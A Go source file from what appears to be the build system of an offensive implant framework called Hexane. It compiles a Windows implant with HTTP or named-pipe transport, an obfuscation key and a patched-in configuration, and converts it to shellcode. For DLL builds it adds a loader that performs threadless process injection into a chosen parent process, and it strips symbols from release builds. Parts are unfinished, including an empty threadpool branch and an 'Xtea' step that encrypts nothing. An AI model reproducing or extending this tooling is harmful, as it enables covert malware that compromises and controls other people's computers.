package core

import (
	"fmt"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strconv"
	"time"
)

func (h *HexaneConfig) RunBuild() error {
	var err error

	if err = h.BuildUpdate(); err != nil {
		return err
	}

	go h.HttpServerHandler()
	time.Sleep(time.Millisecond * 500)

	return nil
}

func (h *HexaneConfig) CreateIncludes(incs []string) string {
	var list string

	for _, inc := range incs {
		list += fmt.Sprintf(" -I%s ", inc)
	}

	return list
}

func (h *HexaneConfig) CreateArguments(args []string) string {
	var (
		list string
	)

	for _, arg := range args {
		list += fmt.Sprintf(" %s ", arg)
	}
	return list
}

func (h *HexaneConfig) CreateDefinitions(defs map[string][]byte) string {
	var list string

	if h.Implant.ProfileTypeId == TRANSPORT_HTTP {
		list += " -DTRANSPORT_HTTP "

	} else if h.Implant.ProfileTypeId == TRANSPORT_PIPE {
		list += " -DTRANSPORT_PIPE "
	}

	if h.Compiler.Debug {
		list += " -DDEBUG "
	}

	for name, def := range defs {
		arr := CreateCppArray(def, len(def))

		if def == nil {
			list += fmt.Sprintf(" -D%s ", name)
		} else {
			list += fmt.Sprintf(" -D%s=%s ", name, arr)
		}
	}
	return list
}

func (h *HexaneConfig) CompileObject(command string, targets, flags, includes []string, output string, key []byte) error {
	var (
		Command string
		err     error
	)

	Command += command

	if targets != nil {
		Command += h.CreateArguments(targets)
	}

	if key != nil {
		Command += h.CreateDefinitions(map[string][]byte{"OBF_KEY": key})
	}

	if includes != nil {
		Command += h.CreateIncludes(includes)
	}

	if flags != nil {
		Command += h.CreateArguments(flags)
	}

	Command += fmt.Sprintf(" -o %s ", output)

	if err = h.RunCommand(Command); err != nil {
		return err
	}
	return nil
}

func (h *HexaneConfig) GenerateConfig() error {
	var (
		Patch []byte
		Xtea  []byte
		err   error
	)

	h.Key = nil
	h.Key = CryptCreateKey(16)

	if Patch, err = h.PePatchConfig(); err != nil {
		return err
	}

	Xtea = Patch

	h.ConfigBytes = Xtea
	return nil
}


func (h *HexaneConfig) GetInjectMethod() InjectConfig {
	var InjectCfg InjectConfig

	if h.Implant.Injection.Threadless != nil {
		InjectCfg.InjectMethod = h.Implant.Injection.Threadless.Execute
		InjectCfg.InjectObject = h.Compiler.BuildDirectory + "/" + filepath.Base(InjectCfg.InjectMethod) + ".o"
		InjectCfg.InjectConfig = map[string][]byte{
			"OBF_KEY": h.Key,
			"PARENT":  []byte(h.Implant.Injection.Threadless.ProcName),
			"MODULE":  []byte(h.Implant.Injection.Threadless.ModuleName),
			"FUNC":    []byte(h.Implant.Injection.Threadless.FuncName),
		}
	} else if h.Implant.Injection.Threadpool != nil {
		// TP
	}

	return InjectCfg
}

func (h *HexaneConfig) GenerateLoader() error {
	var err error

	InjectCfg := h.GetInjectMethod()
	RsrcObj := h.Compiler.BuildDirectory + "/resource.res"
	RsrcData := h.Compiler.BuildDirectory + "/shellcode.bin"
	LoaderObj := h.Compiler.BuildDirectory + "/loader.asm.o"
	LoaderData := h.Compiler.BuildDirectory + "/loader.bin"
	CoreComponents := h.Compiler.BuildDirectory + "/ldrcore.cpp.o"
	Output := h.Compiler.BuildDirectory + "/" + h.ImplantName + h.Compiler.FileExtension

	if err = h.RunCommand(h.Compiler.Windres + " -O coff " + RsrcScript + " -DRSRCDATA=\"" + RsrcData + "\" -o " + RsrcObj); err != nil {
		return err
	}

	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + " " + LoaderData); err != nil {
		return err
	}

	// TODO: change this from preproc-def to embeded in section config
	// tbh none of this should be preproc-defs
	if InjectCfg.InjectConfig["LOADER"], err = os.ReadFile(LoaderData); err != nil {
		return err
	}

	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{InjectCfg.InjectMethod}, nil, h.Compiler.IncludeDirs, InjectCfg.InjectObject, h.Key); err != nil {
		return err
	}

	if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{CoreComponents, InjectCfg.InjectObject}, nil, h.Compiler.IncludeDirs, CoreComponents, h.Key); err != nil {
		return err
	}

	if err = h.CompileObject(h.Compiler.Mingw, Components, []string{"-shared"}, h.Compiler.IncludeDirs, Output, h.Key); err != nil {
		return err
	}

	if !h.Compiler.Debug {
		if err = h.RunCommand(h.Compiler.Strip + " " + Output); err != nil {
			return err
		}
	}

	return nil
}

func (h *HexaneConfig) GenerateObjects() error {
	var (
		files []os.DirEntry
		dir   string
		err   error
	)

	WrapMessage("DBG", "generating core object files")
	var embedStrings = h.GetEmbededStrings()

	for _, dir = range h.Compiler.ComponentDirs {
		if files, err = os.ReadDir(dir); err != nil {
			return err
		}

		for _, file := range files {
			if file.Name() == ".idea" {
				continue
			}

			FilePath := RootDirectory + dir + "/" + file.Name()
			ObjFile := RootDirectory + h.Compiler.BuildDirectory + "/" + file.Name() + ".o"

			if path.Ext(file.Name()) == ".cpp" {
				if err = h.CompileObject(h.Compiler.Mingw+" -c ", []string{FilePath}, h.Compiler.Flags, []string{RootDirectory}, ObjFile, h.Key); err != nil {
					return err
				}

				if file.Name() == "core.cpp" {
					if err = h.EmbedSectionData(ObjFile, ".text$F", h.ConfigBytes); err != nil {
						return err
					}
					if err = h.EmbedSectionData(ObjFile, ".text$G", embedStrings); err != nil {
						return err
					}
				}

				h.Components = append(h.Components, ObjFile)

			} else if path.Ext(file.Name()) == ".asm" {
				if err = h.CompileObject(h.Compiler.Assembler+" -f win64 ", []string{FilePath}, nil, nil, ObjFile, h.Key); err != nil {
					return err
				}

				h.Components = append(h.Components, ObjFile)
			}
		}
	}

	WrapMessage("DBG", "building intermediate object")
	Intermediate := h.Compiler.BuildDirectory + "/interm.exe"

	if err = h.CompileObject(h.Compiler.Linker+" -T "+Ld, h.Components, nil, h.Compiler.IncludeDirs, Intermediate, nil); err != nil {
		return err
	}

	return nil
}

func (h *HexaneConfig) RunCommand(cmd string) error {
	var (
		Command *exec.Cmd
		Log     *os.File
		LogName string
		err     error
	)

	LogName = "../logs/" + strconv.Itoa(int(h.Implant.PeerId)) + "-build-error.log"

	if Log, err = os.Create(LogName); err != nil {
		return err
	}

	defer Log.Close()

	Command = exec.Command("bash", "-c", cmd)
	Command.Stdout = Log
	Command.Stderr = Log

	if err = Command.Run(); err != nil {
		return fmt.Errorf("compilation error. Check %s for details", LogName)
	}

	return nil
}

func (h *HexaneConfig) BuildUpdate() error {
	var (
		err error
	)

	WrapMessage("INF", "starting build...")

	if err = os.MkdirAll(h.Compiler.BuildDirectory, os.ModePerm); err != nil {
		return err
	}

	if err = h.GenerateConfig(); err != nil {
		return err
	}

	if err = GenerateHashes(); err != nil {
		return err
	}

	if err = h.GenerateObjects(); err != nil {
		return err
	}

	if err = h.GenerateShellcode(); err != nil {
		return err
	}

	if h.BuildType == "dll" {
		if err = h.GenerateLoader(); err != nil {
			return err
		}
	}

	AddConfig(h)
	WrapMessage("INF", fmt.Sprintf("%s ready!", h.ImplantName))

	return nil
}
